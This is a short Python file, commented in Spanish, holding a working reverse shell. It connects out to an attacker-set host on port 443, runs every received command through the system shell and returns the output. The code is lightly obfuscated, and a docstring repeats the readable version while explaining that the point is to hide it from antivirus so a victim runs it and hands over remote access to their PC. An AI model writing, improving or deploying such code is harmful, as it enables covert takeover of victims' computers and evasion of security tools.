import socket as s
import subprocess as sp

#esta es una forma basica de ofuscacion, se puede ofuscar con base64 tambien
A= "0.0.0.0" #ip a atacar

B= 443 #el puerto a atacar

C = 1024

D = s.socket(s.AF_INET, s.SOCK_STREAM)
D.connect((A, B))

while True:
    try:
        E = D.recv(C)
        if not E:
            break
        F = E.decode("utf-8").strip()

        if len(F) > 1:
            try: 
                G = sp.check_output(F, shell=True, stderr=sp.STDOUT)
            except sp.CalledProcessError as H:
                G = H.output
            D.send(G)
    except Exception as I:
        D.send(f"Error: {str(I)}\n" .encode('utf-8'))
        break

D.close()

"""
esto es una secuencia de codigos para conectarte de manera remota 
a una pc infectada con un spyware desde un executable la idea es
que arriba se encuentre este mismo codigo pero ofuscado para que 
los antivirus no lo detecten y la victima lo pueda ejecutar 
permitiendonos tener acceso a su pc siempre y cuando ejecute el
codigo o el exe a posteriori  

LHOST= "0.0.0.0" #ip a atacar

LPORT= 443 #el puerto a atacar

BUFFER_SIZE = 1024

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((LHOST, LPORT))

while True:
    try:
        data = client.recv(BUFFER_SIZE)
        if not data:
            break
        code = data.decode("utf-8").strip()

        if len(code) > 1:
            try: 
                output = subprocess.check_output(code, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as error:
                output = error
            client.send(output)
    except Exception as error:
        client.send(f"Error: {error}")

client.close()

"""
